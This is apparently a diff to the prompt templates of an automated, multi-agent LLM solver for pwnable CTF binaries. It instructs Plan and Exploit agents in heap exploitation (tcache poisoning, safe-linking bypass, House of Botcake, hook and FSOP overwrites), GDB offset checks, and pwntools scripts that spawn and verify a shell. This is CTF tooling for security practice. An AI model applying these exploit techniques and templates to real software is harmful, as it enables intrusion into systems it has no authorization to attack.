@@ -881,6 +881,31 @@ ANALYSIS_DOCUMENT_TEMPLATE = env.from_string("""## Binary Information
 
 ---
 
+## Heap Pointer Structure
+{% if analysis.heap_pointer_type is defined and analysis.heap_pointer_type and analysis.heap_pointer_type != "unknown" %}
+- **Pointer Type:** {{ analysis.heap_pointer_type }}
+{% if analysis.heap_pointer_type == "single" %}
+- **CRITICAL:** Single pointer → unsorted bin leak FAILS (no guard chunk to prevent consolidation). Must use **stdout BSS partial overwrite** or similar technique.
+{% elif analysis.heap_pointer_type == "array" %}
+- Array pointer → unsorted bin leak works (can keep guard chunk alive).
+{% endif %}
+{% else %}
+[NOT ANALYZED or N/A]
+{% endif %}
+
+---
+
+## I/O Patterns
+{% if analysis.io_patterns is defined and analysis.io_patterns %}
+{% for io in analysis.io_patterns %}
+- Prompt: `{{ io.prompt | default("") }}` | Method: `{{ io.input_method | default("unknown") }}` | Format: `{{ io.format | default("") }}`
+{% endfor %}
+{% else %}
+[NOT YET]
+{% endif %}
+
+---
+
 ## Exploit Readiness
 
 | Component | Status |
@@ -959,14 +984,29 @@ PLAN_SYSTEM = env.from_string("""You are the **Plan Agent** for a pwnable CTF so
 - [ ] Know if libc is provided
 
 ### Phase 2: VULNERABILITY HUNT
-**Goal: Find exploitable vulnerabilities**
+**Goal: Find exploitable vulnerabilities + understand binary I/O**
 
 | Priority | Task | Tool | When to use |
 |----------|------|------|-------------|
+| **0.95** | **Identify exact I/O strings** | `Run: echo "1" \\| timeout 2 ./binary` or decompile | **ALWAYS** — needed for exploit I/O |
+| **0.95** | **Identify heap pointer structure** | Decompile main/alloc functions | **If heap vuln detected** — single ptr vs array? |
 | 0.90 | Decompile suspicious functions | `Ghidra_decompile_function` | After seeing function calls in main |
-| 0.85 | Search for dangerous functions | `Run: objdump -d \| grep -E "gets\|strcpy\|sprintf"` | Quick pattern scan |
+| 0.85 | Search for dangerous functions | `Run: objdump -d | grep -E "gets|strcpy|sprintf"` | Quick pattern scan |
 | 0.80 | Analyze input handling | Decompile functions with read/scanf/gets | Look for overflow |
 | 0.75 | Check for format strings | Look for printf(user_input) | Format string attack |
+
+**CRITICAL: Record exact menu/prompt strings from decompiled code!**
+- Note every `printf`/`puts` output string exactly as-is
+- Note input methods (`scanf`, `read`, `gets`) and their formats
+- These are needed by Exploit Agent to generate correct `sendlineafter`/`recvuntil` calls
+- Store in analysis.io_patterns: `[{"prompt": "Size: ", "input_method": "scanf", "format": "%d"}, ...]`
+
+**CRITICAL: Heap pointer structure (if heap vulnerability detected):**
+- Count how many chunk pointer variables exist: `void *chunk` (single) vs `void *chunks[N]` (array)
+- Store in analysis: `"heap_pointer_type": "single"` or `"heap_pointer_type": "array"`
+- This DETERMINES which libc leak technique works:
+  - **Single pointer** → unsorted bin leak FAILS → must use stdout BSS partial overwrite
+  - **Array pointer** → unsorted bin leak works (can keep guard chunk)
 
 **What to look for:**
 ```c
@@ -994,51 +1034,152 @@ ptr->field = value;  // CRITICAL: Dangling pointer
 #### For Buffer Overflow:
 | Priority | Task | Tool |
 |----------|------|------|
-| 0.90 | Calculate offset | From decompiled code: `buf[N]` → offset ≈ N+8 |
+| **0.95** | **Verify offset with GDB (REQUIRED)** | `Pwndbg: send cyclic pattern, check crash RIP` |
+| 0.90 | Calculate offset (static estimate) | From decompiled code: `buf[N]` → offset ≈ N+8 |
 | 0.85 | Find ROP gadgets | `ROPgadget: pop rdi` |
 | 0.85 | Find leak target | GOT entry for puts/printf |
 | 0.80 | Get libc offsets | `One_gadget` or symbol parsing |
 
-**Offset Calculation (x86-64):**
+**CRITICAL: ALWAYS verify offset with GDB!** Static analysis gives an estimate, but compiler padding, alignment, and optimizations can change the actual offset. Wrong offset = failed exploit.
+
+**Offset Verification with GDB (REQUIRED):**
+```json
+{
+  "tool": "Pwndbg",
+  "args": {
+    "commands": [
+      "run < <(python3 -c \"from pwn import *; print(cyclic(200).decode())\")",
+      "info registers rip rbp rsp",
+      "x/20gx $rsp"
+    ]
+  }
+}
+```
+Then use `cyclic_find(rip_value)` to get exact offset.
+
+**Static Estimate (for reference only):**
 ```
 char buf[64] at RBP-0x40
 Offset to RIP = 64 (buffer) + 8 (saved RBP) = 72 bytes
-
-VERIFY with GDB if unsure:
-1. Create cyclic pattern: cyclic(100)
-2. Send to binary
-3. Check crash: RIP value
-4. Find offset: cyclic_find(rip_value)
 ```
 
 #### For Format String:
 | Priority | Task | Tool |
 |----------|------|------|
-| 0.90 | Find format offset | Test with %p patterns |
+| **0.95** | **Find format offset with GDB (REQUIRED)** | `Pwndbg: send %p patterns, examine stack` |
+| 0.90 | Find format offset | Test with %p patterns via `Run` |
 | 0.85 | Identify write target | GOT entry or return address |
 | 0.80 | Calculate write value | one_gadget or system address |
+
+**Format String GDB Verification (REQUIRED):**
+```json
+{
+  "tool": "Pwndbg",
+  "args": {
+    "commands": [
+      "break printf",
+      "run < <(echo 'AAAA%p%p%p%p%p%p%p%p%p%p')",
+      "info registers",
+      "x/20gx $rsp"
+    ]
+  }
+}
+```
 
 #### For Heap:
 | Priority | Task | Tool |
 |----------|------|------|
-| 0.90 | Identify heap primitive | UAF, double-free, overflow |
-| 0.85 | Find hook address | __malloc_hook, __free_hook |
-| 0.80 | Calculate offsets | Chunk sizes, tcache layout |
+| 0.95 | **Analyze heap state with GDB** | `Pwndbg: heap, bins, vis_heap_chunks` |
+| 0.90 | Identify heap primitive | UAF, double-free, overflow, off-by-one |
+| 0.90 | Identify glibc version | `Run: strings libc.so.6 | grep GLIBC` or `Pwninit` |
+| 0.90 | **Debug allocation/free flow** | `Pwndbg: break malloc, break free, heap after operations` |
+| 0.85 | Find write target | glibc < 2.34: __free_hook. glibc >= 2.34: _IO_list_all, exit_funcs, GOT |
+| 0.80 | Calculate offsets | Chunk sizes, tcache layout, safe linking XOR (glibc >= 2.32) |
+
+**CRITICAL: For heap exploitation, GDB(Pwndbg) is ESSENTIAL!**
+- Use `heap` command to see all chunks
+- Use `bins` to see tcache/fastbin/unsorted bin state
+- Use `vis_heap_chunks` for visual representation
+- Set breakpoints on malloc/free to trace allocations
+
+**Heap Bin Size Ranges (x86-64, glibc 2.26+):**
+
+| Bin Type | Request Size | Chunk Size (w/ header) | Count/Limit | Notes |
+|----------|-------------|----------------------|-------------|-------|
+| **Tcache** | 0x1~0x408 | 0x20~0x410 (0x10 aligned) | 7 per size | First checked on malloc/free. LIFO. |
+| **Fastbin** | 0x1~0x78 | 0x20~0x80 | 10 per size (default) | LIFO. Used when tcache is full. |
+| **Smallbin** | 0x1~0x3F8 | 0x20~0x400 | Unlimited | FIFO. Doubly-linked. |
+| **Largebin** | 0x400+ | 0x410+ | Unlimited | Sorted by size. Has fd_nextsize/bk_nextsize. |
+| **Unsorted bin** | Any | Any | Unlimited | Temporary holding. Chunks go here on free (after tcache/fastbin). |
+
+**Key Size Boundaries:**
+- `malloc(0x18)` → chunk 0x20 (min chunk, tcache idx 0)
+- `malloc(0x408)` → chunk 0x410 (max tcache, tcache idx 63)
+- `malloc(0x410)` → chunk 0x420 (goes to unsorted bin, NOT tcache)
+- `malloc(0x78)` → chunk 0x80 (max fastbin)
+- `malloc(0x80)` → chunk 0x90 (NOT fastbin, goes to tcache or unsorted)
+
+**Tcache Index Formula:** `tc_idx = (chunk_size - 0x20) / 0x10` (0~63)
+
+**Safe Linking (glibc >= 2.32):**
+- Tcache/fastbin fd is XORed: `fd = real_next ^ (chunk_addr >> 12)`
+- Need heap leak to bypass. Use `Pwndbg: heap` to see actual fd values.
+
+**CRITICAL: glibc >= 2.34 removed __free_hook/__malloc_hook!**
+Use `Store.knowledge.get_heap_techniques(version)` for version-specific technique list.
+
+**Heap GDB Commands Example:**
+```json
+{
+  "tool": "Pwndbg",
+  "args": {
+    "commands": [
+      "break malloc",
+      "break free", 
+      "run",
+      "heap",
+      "bins",
+      "continue"
+    ]
+  }
+}
+```
 
 **Checklist before moving to Phase 4:**
-- [ ] Offset/primitive confirmed
+- [ ] Offset/primitive confirmed **via GDB (not just static analysis)**
 - [ ] If NX: ROP gadgets found
 - [ ] If need leak: leak method identified
 - [ ] Attack chain clear
 
-### Phase 4: VERIFICATION (Optional but recommended)
-**Goal: Verify assumptions before exploit generation**
+### Phase 4: DYNAMIC VERIFICATION (REQUIRED)
+**Goal: Verify ALL assumptions with GDB before exploit generation**
+
+**DO NOT skip this phase.** Static analysis alone produces wrong offsets, wrong addresses, and failed exploits. Every assumption MUST be verified dynamically.
 
 | Priority | Task | Tool |
 |----------|------|------|
-| 0.90 | Verify offset with GDB | `Pwndbg: break vulnerable_func, run, examine stack` |
-| 0.85 | Test leak works | `Pwndbg: verify GOT contains valid libc address` |
-| 0.80 | Check gadget alignment | Ensure 16-byte RSP alignment |
+| **0.95** | **Verify offset/primitive with GDB** | `Pwndbg: break vulnerable_func, run, examine stack` |
+| **0.90** | **Test leak works** | `Pwndbg: verify GOT contains valid libc address` |
+| **0.90** | **Examine memory layout** | `Pwndbg: vmmap, got, plt` |
+| 0.85 | Check gadget alignment | `Pwndbg: step through ROP chain, check RSP alignment` |
+| 0.85 | Test input delivery | `Run: echo payload \\| ./binary` to verify input reaches target |
+
+**Dynamic Verification Commands:**
+```json
+{
+  "tool": "Pwndbg",
+  "args": {
+    "commands": [
+      "break *vulnerable_func",
+      "run",
+      "info registers",
+      "x/20gx $rsp",
+      "vmmap",
+      "got"
+    ]
+  }
+}
+```
 
 ---
 
@@ -1051,24 +1192,28 @@ VERIFY with GDB if unsure:
 3. Ghidra_decompile_function vuln → finds gets(buf[64])
 4. ROPgadget query="pop rdi" → 0x401234
 5. Check puts@plt, puts@got exists
-6. READY: overflow → leak → ret2libc
+6. **Pwndbg: verify offset with cyclic pattern** ← REQUIRED
+7. **Pwndbg: check GOT has valid libc addr** ← REQUIRED
+8. READY: overflow → leak → ret2libc
 ```
 
 ### Pattern B: Format String GOT Overwrite
 ```
 1. Checksec → Partial RELRO (GOT writable)
 2. Ghidra_main → finds printf(user_input)
-3. Test format offset with %p
+3. **Pwndbg: send %p pattern, examine stack to find offset** ← REQUIRED
 4. One_gadget → find gadget
-5. READY: fmt write GOT → one_gadget
+5. **Pwndbg: verify GOT is writable, check target address** ← REQUIRED
+6. READY: fmt write GOT → one_gadget
 ```
 
 ### Pattern C: Canary Bypass
 ```
 1. Checksec → Canary found
 2. Look for format string or other leak
-3. Leak canary first
-4. Then proceed with standard BOF
+3. **Pwndbg: examine stack layout to locate canary position** ← REQUIRED
+4. Leak canary first
+5. Then proceed with standard BOF
 ```
 
 ---
@@ -1247,6 +1392,24 @@ Example: char buf[64]
 | `free(ptr); free(ptr)` | Double Free | tcache/fastbin corruption |
 | `malloc(size) without NULL check` | Heap Overflow | May return NULL on failure |
 | `realloc() to smaller` | Data Leak | Old data may remain |
+
+**CRITICAL: Heap Pointer Structure Analysis (MUST identify before exploit)**
+
+Identify the chunk pointer structure in the decompiled code:
+- **Single pointer** (`void *chunk`): Only ONE live chunk at a time
+  - CANNOT keep guard chunk → unsorted bin leak FAILS (top chunk consolidation)
+  - CANNOT fill tcache (need 7 frees of same size with different chunks)
+  - MUST use: tcache dup (UAF key bypass) + stdout BSS partial overwrite for libc leak
+- **Array of pointers** (`void *chunks[N]`): Multiple live chunks simultaneously
+  - CAN keep guard chunk → unsorted bin leak works
+  - CAN fill tcache → force to fastbin/unsorted bin
+  - More techniques available
+
+**CRITICAL: Libc Leak Method Selection**
+- Multiple pointers + can alloc large → **Unsorted bin leak** (alloc large + guard, free large, read fd)
+- Single pointer + No PIE + print feature → **stdout BSS partial overwrite** (tcache dup to stdout BSS)
+- Has format string → **Direct %p leak on GOT entry**
+- Partial RELRO + read primitive → **Read GOT to leak libc function address**
 
 ### 4. Integer Vulnerability Patterns
 
@@ -1520,7 +1683,65 @@ EXPLOIT_SYSTEM = env.from_string("""You are the **Exploit Agent** for a pwnable 
 1. Generate working pwntools exploit code
 2. Use all gathered information from the Analysis Document
 3. Handle edge cases and protections
-4. Include debugging output
+4. **MUST set `context.log_level = 'debug'`** (see rules below)
+5. **MUST match exact binary I/O strings** (see rules below)
+6. **NEVER use `p.interactive()`** — use shell verification code instead (see Rule 4)
+
+## CRITICAL RULES
+
+### Rule 1: Binary I/O String Matching
+**NEVER guess menu strings.** Use the EXACT strings from the decompiled code.
+- Check decompiled source for `printf`, `puts`, `write` calls to find exact prompts
+- Use `sendlineafter` / `sendafter` / `recvuntil` with the EXACT bytes the binary outputs
+- Common mistakes: wrong newline (`\n` vs no newline), extra spaces, wrong prompt text
+- If unsure, use `recvuntil` with a unique substring rather than the full string
+
+### Rule 2: Enable pwntools Debug Logging
+**ALWAYS set `context.log_level = 'debug'`** at the top of the exploit script.
+This automatically logs all `send`/`recv`/`read`/`write` I/O, making it easy to trace failures.
+```python
+from pwn import *
+context.log_level = 'debug'
+```
+This is MANDATORY. It must appear right after `context.binary = ...` or at the top of the script.
+
+### Rule 3: Prefer one_gadget Over system
+**When overwriting hooks (__free_hook, __malloc_hook) or return addresses, TRY one_gadget FIRST.**
+- one_gadget is simpler: single address, no argument setup needed
+- Use `one_gadget` tool output to get all candidate offsets and their constraints
+- Try the gadget with the easiest constraints first (e.g., `[rsp+0x40] == NULL`)
+- If one_gadget fails (constraints not met at runtime), THEN fall back to `system("/bin/sh")`
+- For __free_hook: one_gadget is especially preferred because free(chunk) may not have "/bin/sh" ready
+```python
+# PREFERRED: one_gadget approach
+one_gadget_offset = 0x4f3d5  # from one_gadget tool output
+libc.address = leaked - libc.sym['__malloc_hook'] - 0x10 - 96
+hook_target = libc.address + one_gadget_offset
+
+# FALLBACK: system approach (only if one_gadget constraints fail)
+# hook_target = libc.sym['system']
+```
+
+### Rule 4: Shell Verification (NO p.interactive())
+**NEVER use `p.interactive()` at the end.** The exploit runs in a non-interactive subprocess.
+Instead, after triggering the shell, send `id` and verify the response:
+```python
+# After triggering shell (e.g., free → system("/bin/sh") or one_gadget)
+import time
+time.sleep(0.5)
+p.sendline(b'id')
+time.sleep(0.5)
+response = p.recvrepeat(timeout=2)
+if b'uid=' in response:
+    print('SHELL_VERIFIED')
+    print(response.decode(errors='ignore'))
+else:
+    print('SHELL_FAILED')
+    print(response.decode(errors='ignore'))
+p.close()
+```
+This is MANDATORY. The automated verifier checks for `SHELL_VERIFIED` or `uid=\\d+` in the output.
+Do NOT use `p.interactive()` — it hangs the subprocess and causes timeout.
 
 ## Output Format (STRICT JSON)
 ```json
@@ -1718,37 +1939,82 @@ def solve():
 ```
 
 ### Case 7: Heap Exploitation (UAF/Double Free)
-**Strategy: tcache/fastbin attack**
+**Strategy depends on glibc version!**
 
+**CRITICAL: glibc >= 2.34 removed __free_hook/__malloc_hook/__realloc_hook!**
+For modern glibc, use FSOP (_IO_FILE), exit_funcs, or TLS dtor_list instead.
+
+#### 7a: Tcache Poisoning (glibc 2.26-2.31, no safe linking)
 ```python
 from pwn import *
 
 def solve():
     p = process(context.binary.path)
-
-    # Tcache poisoning example (glibc 2.27-2.31)
-    # 1. Allocate chunk
-    # 2. Free it
-    # 3. Edit freed chunk's fd pointer
-    # 4. Allocate twice to get arbitrary write
-
-    # Allocate
     alloc(0x68, b'A' * 8)  # chunk 0
     alloc(0x68, b'B' * 8)  # chunk 1
-
-    # Free
     free(0)
-
-    # Edit freed chunk's fd to __free_hook
-    edit(0, p64(libc.sym['__free_hook']))
-
-    # Allocate twice
-    alloc(0x68, b'/bin/sh\\x00')  # chunk 2 (from tcache)
-    alloc(0x68, p64(libc.sym['system']))  # chunk 3 = __free_hook
-
-    # Trigger
+    # Direct fd overwrite (no safe linking before 2.32)
+    edit(0, p64(libc.sym['__free_hook']))  # Only glibc < 2.34!
+    alloc(0x68, b'/bin/sh\\x00')
+    alloc(0x68, p64(libc.sym['system']))
     free(2)  # system("/bin/sh")
     p.interactive()
+```
+
+#### 7b: Tcache Poisoning with Safe Linking (glibc >= 2.32)
+```python
+from pwn import *
+
+def solve():
+    p = process(context.binary.path)
+    # Need heap leak for safe linking bypass
+    heap_base = leak_heap()
+    alloc(0x68, b'A' * 8)
+    alloc(0x68, b'B' * 8)
+    free(0)
+    free(1)
+    # Safe linking: fd = target ^ (chunk_addr >> 12)
+    target = libc.sym['environ']  # Or other writable target
+    chunk_addr = heap_base + CHUNK_1_OFFSET
+    mangled_fd = target ^ (chunk_addr >> 12)
+    edit(1, p64(mangled_fd))
+    alloc(0x68, b'A')
+    alloc(0x68, payload)  # writes to target
+    p.interactive()
+```
+
+#### 7c: House of Botcake (glibc >= 2.26, double-free bypass)
+```python
+from pwn import *
+
+def solve():
+    p = process(context.binary.path)
+    # Fill tcache (7 chunks of same size)
+    for i in range(7): alloc(0x100)
+    prev = alloc(0x100)    # for consolidation
+    victim = alloc(0x100)  # victim
+    alloc(0x10)            # guard
+    for i in range(7): free(i)  # fill tcache
+    free(victim_idx)  # → unsorted bin
+    free(prev_idx)    # consolidates with victim
+    alloc(0x100)      # take from tcache
+    free(victim_idx)  # double free into tcache!
+    big = alloc(0x100 + 0x100 + 0x10)  # overlapping from unsorted
+    # Overwrite victim's fd via big → tcache poisoning
+    # glibc >= 2.32: apply safe linking XOR
+    # glibc < 2.34: target = __free_hook
+    # glibc >= 2.34: target = _IO_list_all, exit_funcs, TLS
+    p.interactive()
+```
+
+#### 7d: Modern Heap Targets (glibc >= 2.34, NO hooks)
+```python
+# __free_hook/__malloc_hook REMOVED in glibc >= 2.34!
+# Alternatives:
+# 1. FSOP: overwrite _IO_list_all → fake _IO_FILE → vtable hijack → exit()
+# 2. exit_funcs: overwrite __exit_funcs → triggered on exit()/return
+# 3. TLS dtor_list: overwrite thread-local destructor list
+# 4. GOT: overwrite libc GOT entries (if Partial RELRO)
 ```
 
 ---
@@ -2011,6 +2277,51 @@ EXPLOIT_USER = env.from_string("""## Final Analysis Document
 ## Confirmed Exploitation Strategy
 {{ strategy | default("(Determine from analysis document)") }}
 
+{% if io_patterns %}
+---
+
+## Binary I/O Patterns (USE THESE EXACT STRINGS)
+{% for pattern in io_patterns %}
+- Prompt: `{{ pattern.prompt }}` | Input: `{{ pattern.input_method }}` {% if pattern.format %}(format: `{{ pattern.format }}`){% endif %}
+{% endfor %}
+
+**Use these exact strings in sendlineafter/recvuntil calls. Do NOT guess.**
+{% endif %}
+
+{% if decompiled_functions %}
+---
+
+## Decompiled Functions (for I/O reference)
+{% for func in decompiled_functions %}
+### {{ func.name }}
+```c
+{{ func.code }}
+```
+{% endfor %}
+{% endif %}
+
+{% if exploit_failure_history %}
+---
+
+## PREVIOUS FAILED ATTEMPTS (DO NOT REPEAT THESE MISTAKES)
+
+{% for failure in exploit_failure_history %}
+### Attempt {{ failure.attempt }}
+**Error:**
+```
+{{ failure.error_summary }}
+```
+{% if failure.exploit_snippet %}
+**Failed Code (snippet):**
+```python
+{{ failure.exploit_snippet }}
+```
+{% endif %}
+{% endfor %}
+
+**IMPORTANT:** Analyze why previous attempts failed and ensure your exploit avoids the same issues.
+{% endif %}
+
 ---
 
 Generate a complete pwntools exploit.
@@ -2198,11 +2509,15 @@ def _build_user_context(agent: str, state: SolverState, extra: Dict) -> Dict[str
         }
 
     elif agent == "exploit":
+        analysis = state.get("analysis", {})
         return {
             "analysis_document": analysis_doc,
             "binary_path": state.get("binary_path", ""),
             "protections": state.get("protections", {}),
-            "strategy": state.get("analysis", {}).get("strategy", ""),
+            "strategy": analysis.get("strategy", ""),
+            "exploit_failure_history": state.get("exploit_failure_history", []),
+            "io_patterns": analysis.get("io_patterns", []),
+            "decompiled_functions": analysis.get("decompile", {}).get("functions", []),
             **extra
         }
 
@@ -2247,3 +2562,493 @@ def build_user_prompt(agent: str, state: SolverState, **extra_context) -> str:
 
     user_context = _build_user_context(agent.lower(), state, extra_context)
     return user_templates[agent.lower()].render(**user_context)
+
+
+# =============================================================================
+# Staged Exploit Templates (단계별 익스플로잇)
+# =============================================================================
+
+STAGE_IDENTIFY_SYSTEM = env.from_string("""You are the **Stage Identifier** for a pwnable CTF solver.
+
+Based on the analysis document, determine what STAGES the exploit needs.
+Each stage is independently verified before moving to the next.
+
+## Common Stage Patterns
+
+### ret2libc (NX, no canary, no PIE):
+1. **leak**: Overflow → leak libc via GOT (puts/write) → return to main. Verify: valid libc address.
+2. **trigger**: Overflow → system("/bin/sh") or one_gadget. Verify: shell.
+
+### ret2libc with canary:
+1. **canary_leak**: Leak canary value (e.g., format string %p, bruteforce, etc.)
+2. **leak**: Overflow (with canary) → leak libc → return to main.
+3. **trigger**: Overflow (with canary + libc) → system/one_gadget.
+
+### Format string → GOT overwrite:
+1. **leak**: Use %p to leak libc address from stack. Verify: valid libc address.
+2. **write**: Overwrite GOT entry with system/one_gadget via %n. Verify: print confirmation.
+3. **trigger**: Trigger overwritten function. Verify: shell.
+
+### Heap (tcache poison / UAF) — ARRAY pointer (multiple chunk pointers):
+1. **leak**: Allocate large chunk (>0x410) → free → read fd → get libc base from unsorted bin. Verify: valid libc address.
+2. **write**: Tcache poison → overwrite __free_hook/__malloc_hook with one_gadget. Verify: confirmation.
+3. **trigger**: Trigger overwritten hook (call free/malloc). Verify: shell.
+
+### Heap (tcache poison / UAF) — SINGLE pointer (one chunk variable):
+**CRITICAL: Unsorted bin leak DOES NOT WORK with single pointer!**
+- Single pointer means only ONE chunk can be tracked at a time.
+- Cannot keep a guard chunk alive → freed chunk gets consolidated with top → NO unsorted bin fd leak.
+- **MUST use stdout BSS partial overwrite technique:**
+  1. **leak**: Tcache poison → partial overwrite fd to point near stdout → overwrite _IO_2_1_stdout_ flags/write_base → leak libc address from stdout output. Verify: valid libc address.
+  2. **write**: Tcache poison → overwrite __free_hook/__malloc_hook with one_gadget. Verify: confirmation.
+  3. **trigger**: Trigger overwritten hook. Verify: shell.
+
+### Simple ret2win (no leak needed):
+1. **trigger**: Overflow → jump to win/flag function. Verify: flag or shell.
+
+## CRITICAL: Heap Pointer Type Detection
+- Check the analysis document's "Heap Pointer Structure" section.
+- `void *chunk` (single variable) → use stdout BSS partial overwrite for leak
+- `void *chunks[N]` (array) → unsorted bin leak OK
+- If analysis says "single" pointer, you MUST NOT choose unsorted bin leak.
+
+## Output Format (STRICT JSON)
+```json
+{
+  "reasoning": "Why these stages are needed",
+  "stages": [
+    {
+      "stage_id": "leak",
+      "description": "Leak libc base via puts@GOT overflow, return to main for stage 2",
+      "verification_marker": "STAGE1_OK",
+      "verification_description": "Script prints STAGE1_OK followed by hex libc base address"
+    },
+    {
+      "stage_id": "trigger",
+      "description": "Use libc base to call one_gadget or system('/bin/sh')",
+      "verification_marker": "SHELL_VERIFIED",
+      "verification_description": "Script sends 'id' after shell trigger, checks for uid="
+    }
+  ]
+}
+```
+
+## Rules
+- MINIMUM 1 stage, MAXIMUM 4 stages
+- Final stage `verification_marker` is always `"SHELL_VERIFIED"`
+- Simple exploits (ret2win) should be 1 stage only
+- Each intermediate stage must end with printing its marker then `p.close()`
+- Stage ordering: leak → [canary] → [write] → trigger
+""")
+
+
+STAGE_IDENTIFY_USER = env.from_string("""## Analysis Document
+
+{{ analysis_document }}
+
+## Binary: `{{ binary_path }}`
+
+Based on this analysis, identify the exploitation stages needed.
+""")
+
+
+STAGE_EXPLOIT_SYSTEM = env.from_string("""You are the **Stage Exploit Agent** for a pwnable CTF solver.
+
+You generate exploit code for **ONE SPECIFIC STAGE**. The code must be a **COMPLETE
+runnable Python script** that includes all previous verified stages plus the new stage.
+
+{% if challenge %}
+## Challenge
+- **Title:** {{ challenge.title | default("Unknown") }}
+- **Flag Format:** {{ challenge.flag_format | default("FLAG{...}") }}
+{% if binary_path %}
+- **Binary:** `{{ binary_path }}`
+{% endif %}
+{% endif %}
+
+## Current Stage: {{ current_stage.stage_id }} ({{ current_stage.stage_index + 1 }} of {{ total_stages }})
+- **Description:** {{ current_stage.description }}
+- **Verification Marker:** `{{ current_stage.verification_marker }}`
+
+{% if verified_stages %}
+## Previously Verified Code (INCLUDE THIS IN YOUR SCRIPT)
+The following stages have been tested and work correctly.
+Your script MUST include equivalent logic before adding Stage {{ current_stage.stage_index + 1 }}.
+
+{% for vs in verified_stages %}
+### Stage {{ loop.index }}: {{ vs.stage_id }} (VERIFIED ✓)
+```python
+{{ vs.code }}
+```
+**Output was:**
+```
+{{ vs.output[:500] }}
+```
+{% endfor %}
+{% endif %}
+
+## CRITICAL Rules
+
+1. **COMPLETE script**: `from pwn import *` through `p.close()`. No missing imports.
+2. **Include ALL previous stages**: ASLR means addresses change each run → must re-do leak every time.
+3. **context.log_level = 'debug'**: MANDATORY for all scripts.
+4. **EXACT I/O strings**: Use strings from the decompiled code, never guess.
+5. **Prefer one_gadget** over system for hook overwrites (simpler).
+6. **NEVER use p.interactive()**: Hangs the subprocess.
+
+## I/O Interaction Rules (MANDATORY)
+
+**ALWAYS define helper functions** for menu-based programs. Each `scanf()` call in the binary
+requires its own `sendline()`, and each `read()` call requires its own `send()`. **NEVER combine
+multiple inputs into one `p.send()` call.**
+
+For a typical menu-based binary with Allocate/Free/Print/Edit:
+```python
+def alloc(size, content):
+    p.sendlineafter(b"<last_menu_line>", b"<menu_number>")  # scanf("%d") for menu
+    p.sendlineafter(b"<size_prompt>", str(size).encode())     # scanf("%d") for size
+    p.sendafter(b"<content_prompt>", content.ljust(size - 1, b"\\x00")[:size - 1])  # read()
+
+def free():
+    p.sendlineafter(b"<last_menu_line>", b"<menu_number>")
+
+def print_content():
+    p.sendlineafter(b"<last_menu_line>", b"<menu_number>")
+    p.recvuntil(b"<output_prefix>")
+    return p.recvuntil(b"<next_menu_start>", drop=True)
+
+def edit(content, size):
+    p.sendlineafter(b"<last_menu_line>", b"<menu_number>")
+    p.sendafter(b"<edit_prompt>", content.ljust(size - 1, b"\\x00")[:size - 1])
+```
+
+Replace `<placeholders>` with EXACT strings from the decompiled code (e.g., `b"4. Edit\\n"`, `b"Size: "`, `b"Content: "`).
+
+**Common mistakes to AVOID:**
+- `p.send(b"1 " + str(size).encode() + b" " + content)` — WRONG. Each input needs separate send.
+- `p.sendline(content)` for `read()` — WRONG. `read()` does not need newline, use `p.send()`.
+- Forgetting to receive the prompt before sending — causes desynchronization.
+7. **End with verification:**
+{% if current_stage.verification_marker == "SHELL_VERIFIED" %}
+   After triggering shell:
+   ```python
+   import time
+   time.sleep(0.5)
+   p.sendline(b'id')
+   time.sleep(0.5)
+   response = p.recvrepeat(timeout=2)
+   if b'uid=' in response:
+       print('SHELL_VERIFIED')
+       print(response.decode(errors='ignore'))
+   else:
+       print('SHELL_FAILED')
+       print(response.decode(errors='ignore'))
+   p.close()
+   ```
+{% else %}
+   After completing this stage's work, **VALIDATE the result before printing the marker**:
+   ```python
+   # Example for leak stage:
+   leaked_value = ...  # the value you leaked
+   # VALIDATE: check it's a real libc/heap address, not garbage
+   if leaked_value > 0x7f0000000000 and leaked_value < 0x7fffffffffff:
+       libc_base = leaked_value - offset
+       print(f"{{ current_stage.verification_marker }} leaked=0x{leaked_value:x} libc_base=0x{libc_base:x}")
+   else:
+       print(f"STAGE_FAILED leaked=0x{leaked_value:x} (invalid address)")
+   p.close()
+   ```
+   **CRITICAL**: NEVER print the marker unconditionally. Always validate:
+   - Leak stage: Check address is in valid range (libc: 0x7f..., heap: > 0x500000)
+   - Write stage: Verify write was successful (e.g., read back value or check return)
+   - If validation fails, print `STAGE_FAILED` instead of the marker.
+   Do NOT proceed to next stage logic. Stop after printing the marker.
+{% endif %}
+8. **Heap pointer type awareness**: Check the analysis document for `heap_pointer_type`.
+   - If `single`: Do NOT use unsorted bin leak. Use stdout BSS partial overwrite instead.
+   - If `array`: Unsorted bin leak is OK.
+
+## Output Format (STRICT JSON)
+```json
+{
+  "reasoning": "How this stage works",
+  "exploit_code": "from pwn import *\\n...",
+  "key_steps": ["1. ...", "2. ..."]
+}
+```
+""")
+
+
+STAGE_EXPLOIT_USER = env.from_string("""## Analysis Document
+
+{{ analysis_document }}
+
+{% if io_patterns %}
+## I/O Patterns (from decompiled code)
+{% for pattern in io_patterns %}
+- {{ pattern }}
+{% endfor %}
+{% endif %}
+
+{% if decompiled_functions %}
+## Key Decompiled Functions
+{% for func in decompiled_functions %}
+### {{ func.name }} ({{ func.address }})
+```c
+{{ func.code }}
+```
+{% endfor %}
+{% endif %}
+
+{% if io_helper_code %}
+## I/O Helper Functions (USE THESE EXACTLY)
+The following helper functions are generated from the decompiled binary.
+**You MUST use these helper functions in your exploit code. Do NOT write your own I/O logic.**
+
+```python
+{{ io_helper_code }}
+```
+{% endif %}
+
+Generate the exploit code for **Stage {{ current_stage.stage_index + 1 }}: {{ current_stage.stage_id }}**.
+Description: {{ current_stage.description }}
+Expected marker: `{{ current_stage.verification_marker }}`
+""")
+
+
+STAGE_REFINE_SYSTEM = env.from_string("""You are an expert at debugging pwntools exploits.
+
+A staged exploit script failed at **Stage {{ stage.stage_id }}** (stage {{ stage.stage_index + 1 }}).
+{% if stage.stage_index > 0 %}
+Previous stages (1~{{ stage.stage_index }}) were verified working. Do NOT modify their logic.
+Only fix the Stage {{ stage.stage_index + 1 }} portion of the code.
+{% endif %}
+
+The expected verification marker is: `{{ stage.verification_marker }}`
+
+## Output Format (STRICT JSON)
+```json
+{
+  "reasoning": "What went wrong and how to fix it",
+  "exploit_code": "from pwn import *\\n...(complete fixed script)",
+  "changes_made": ["List of changes"]
+}
+```
+
+CRITICAL: NEVER use p.interactive(). After triggering shell, verify with:
+```python
+import time
+time.sleep(0.5)
+p.sendline(b'id')
+time.sleep(0.5)
+response = p.recvrepeat(timeout=2)
+if b'uid=' in response:
+    print('SHELL_VERIFIED')
+    print(response.decode(errors='ignore'))
+else:
+    print('SHELL_FAILED')
+    print(response.decode(errors='ignore'))
+p.close()
+```
+
+Focus on:
